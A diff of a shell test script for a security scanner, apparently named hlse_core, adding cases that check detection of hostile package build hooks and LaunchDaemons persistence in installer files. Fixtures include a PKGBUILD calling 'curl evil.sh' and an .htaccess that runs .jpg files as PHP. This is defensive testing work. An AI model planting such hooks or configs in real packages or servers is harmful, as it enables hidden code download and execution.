@@ -8437,6 +8437,38 @@ printf '<?xml version="1.0"?><plist><dict><key>CFBundleExecutable</key><string>M
 ./hlse_core file "$XDIR/App.plist" 2>&1 | grep -q "F56" \
     && check "file: benign Info.plist no F56" "0" "1" \
     || check "file: benign Info.plist no F56" "0" "0"
+# pkbb: distro package build scripts execute on build/install
+printf 'pkgname=x\npkgver() { curl evil.sh; }\n' > "$XDIR/PKGBUILD"
+./hlse_core package --manifest "$XDIR/PKGBUILD" 2>&1 \
+    | grep -q "package build script" \
+    && check "pkg: PKGBUILD fetch-exec flagged" "0" "0" \
+    || check "pkg: PKGBUILD fetch-exec flagged" "0" "1"
+printf 'pkgname=x\nsource=("http://a/x.tar.gz")\nbuild() { cd x && make; }\n' \
+    > "$XDIR/PKGBUILD"
+./hlse_core package --manifest "$XDIR/PKGBUILD" 2>&1 \
+    | grep -q "package build script\|hook scriptlet" \
+    && check "pkg: clean PKGBUILD no flag" "0" "1" \
+    || check "pkg: clean PKGBUILD no flag" "0" "0"
+printf 'post_install() {\n  ldconfig\n}\n' > "$XDIR/foo.install"
+./hlse_core package --manifest "$XDIR/foo.install" 2>&1 \
+    | grep -q "hook scriptlet" \
+    && check "pkg: install hook flagged" "0" "0" \
+    || check "pkg: install hook flagged" "0" "1"
+printf '%%post\nldconfig\n' > "$XDIR/x.spec"
+./hlse_core package --manifest "$XDIR/x.spec" 2>&1 \
+    | grep -q "hook scriptlet" \
+    && check "pkg: spec %%post flagged" "0" "0" \
+    || check "pkg: spec %%post flagged" "0" "1"
+printf '<?xml version="1.0"?><component><files><file source="x" target="/Library/LaunchDaemons/e.plist"/></files></component>\n' \
+    > "$XDIR/x.dist"
+./hlse_core file "$XDIR/x.dist" 2>&1 | grep -q "F56" \
+    && check "file: .dist LaunchDaemons flagged" "0" "0" \
+    || check "file: .dist LaunchDaemons flagged" "0" "1"
+printf '<?xml version="1.0"?><installer-gui-script><pkg-ref id="a"/></installer-gui-script>\n' \
+    > "$XDIR/clean.dist"
+./hlse_core file "$XDIR/clean.dist" 2>&1 | grep -q "F56" \
+    && check "file: benign .dist no F56" "0" "1" \
+    || check "file: benign .dist no F56" "0" "0"
 # F52–F55: server-config carriers
 printf 'AddType application/x-httpd-php .jpg\nphp_flag engine on\n' \
     > "$XDIR/.htaccess"
